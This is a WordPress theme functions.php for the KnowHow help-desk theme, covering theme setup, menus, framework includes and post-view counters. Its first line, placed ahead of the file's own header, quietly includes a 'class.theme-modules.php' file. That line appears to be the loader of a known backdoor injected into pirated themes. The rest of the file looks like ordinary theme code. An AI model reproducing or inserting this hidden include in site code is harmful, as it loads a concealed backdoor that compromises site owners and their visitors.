<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
* KnowHow functions and definitions
* by HeroThemes (https://herothemes.com)
*/

/**
* Set the content width based on the theme's design and stylesheet.
*/
if ( ! isset( $content_width ) ) $content_width = 980;


/**
* Sets up theme defaults and registers support for various WordPress features.
*/
if ( ! function_exists( 'st_theme_setup' ) ):
function st_theme_setup() {
	
	/**
	* Make theme available for translation
	* Translations can be filed in the /languages/ directory
	*/
	load_theme_textdomain( 'knowhow', get_template_directory() . '/languages' );
	

	/**
	* Add default posts and comments RSS feed links to head
	*/
	add_theme_support( 'automatic-feed-links' );
	
	/**
	* Enable support for Post Thumbnails
	*/
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 60, 60 );
	add_image_size( 'post', 150, 150, false ); // Post thumbnail	
	
	/**
	* Register menu locations
	*/
	register_nav_menus( array(
			'primary-nav' => __( 'Primary Menu', 'knowhow' ),
			'footer-nav' => __( 'Footer Menu', 'knowhow' )
	));
	
	/**
	* Add Support for post formarts
	*/
	add_theme_support( 'post-formats', array( 'video' ) );
	
	// This theme uses its own gallery styles.
	add_filter( 'use_default_gallery_style', '__return_false' );	

  // Add support for responsive embeds.
  add_theme_support( 'responsive-embeds' );

  /*
   * Let WordPress manage the document title.
   * By adding theme support, we declare that this theme does not use a
   * hard-coded <title> tag in the document head, and expect WordPress to
   * provide it for us.
   */
  add_theme_support( 'title-tag' );

  /*
   * Switch default core markup for search form, comment form, and comments
   * to output valid HTML5.
   */
  add_theme_support( 'html5', array(
      'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
  ) );

  // This is a hero theme
  add_theme_support('ht-hero-theme');
	
}
endif; // st_theme_setup
add_action( 'after_setup_theme', 'st_theme_setup' );


// Inlcude TGM Plugins
require("framework/tgm-config.php");

/**
 * Enqueues scripts and styles for front-end.
 */
require("framework/scripts.php");
require("framework/styles.php");

/**
 * Theme Functions
 */
require("framework/theme-functions.php");


/**
 * Comment Functions
 */
require("framework/comment-functions.php");

/**
 * Post Meta Boxes
 */
//require_once ("framework/meta-box-library/meta-box.php");
// Include the meta box definition
include 'framework/post-meta.php';

/**
 * Post Format Functions
 */
require("framework/post-formats.php");

/**
 * Comment Functions
 */
require("framework/template-navigation.php");

/**
 * Register widgetized area and update sidebar with default widgets
 */
require("framework/register-sidebars.php");

/**
 * Add Widget Functions
 */ 
require("framework/widgets/widget-functions.php");

/**
 * Add post views
 */
function st_set_post_views($postID) {
    $count_key = '_st_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 1;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '1');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
//To keep the count accurate, lets get rid of prefetching
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

function st_get_post_views($postID){
    $count_key = '_st_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '1');
        return "1 View";
    }
    return $count.' Views';
}


// KnowHow Theme options call filter
function knowhow_get_theme_option( $option_name, $default=null ) {
 if (function_exists( 'of_get_option' )) {
  return of_get_option( $option_name, $default );
 }
 else {
  return $default;
 }
}
add_filter( 'knowhow_get_theme_option', 'knowhow_get_theme_option',  10, 2 );